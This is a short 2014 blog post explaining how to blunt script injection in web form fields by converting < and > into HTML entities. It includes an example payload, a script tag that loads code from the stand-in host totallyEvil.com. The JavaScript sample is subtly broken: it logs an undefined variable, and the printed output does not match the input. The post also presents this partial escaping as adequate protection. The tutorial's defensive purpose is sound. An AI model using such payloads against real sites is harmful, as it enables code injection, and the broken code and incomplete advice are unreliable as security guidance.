---
title:  "Prohibit Injectable Scripts"
date:   2014-12-08 15:05:12
main_image: "burglars.jpg"
flickr_attribution: stavos
flickr_link: https://www.flickr.com/photos/stavos52093/11238345176/in/photolist-i86su1-hpmFBT-emdrxE-6LgXp-2j7uWp-EQwdX-8F1kwP-ECCvy-49drf1-8VZ3r7-6Fh4eL-6WeBaL-9X8xgE-buC1P-7yGcE5-Ds9Zq-89dyu6-8iegNp-4fApKj-7eHQ2-di8LQW-5YWuHS-4ZddU-dgQEAx-7NgRvE-4AcEm1-3ADtB-4ufoFq-dvZjDq-8PtZJn-aAP3xK-9sTx4Z-qTxd-yaFq3-F4od4-bHpQbn-nREXr7-7QdMru-EQwdv-4gtg7F-2M3A4C-8VVZwp-8VW1iT-8VW1YM-6Wazzv-7QwYFZ-bov2cY-ng5qF9-8VVXmV-8VZ2JQ
flickr_license: "https://creativecommons.org/licenses/by-nc-nd/2.0/"
---

If you’re capturing information in a form element, it’s a good idea to minimize the chances for someone to inject a malicious script into your site. Script injection is one of the methods used to hack a website. Let’s say someone tries to enter the following into your First Name input:

`<script src="http://totallyEvil.com/demonScript.js"></script>`

An easy thing to do is to convert the “<” and “>” characters into their html entities.

{% highlight javascript %}

var badScripty = '<script src="totallyEvil.com/demonScript.js"></script>';

var safeEntry = badScripty.replace(/</g, "&lt;");
safeEntry = safeEntry.replace(/>/g, "&gt;");

// check safescript
console.log(safeScript);

//returns
&lt;script src="totallyEvilScript.js"&gt;&lt;/script&gt;

{% endhighlight %}
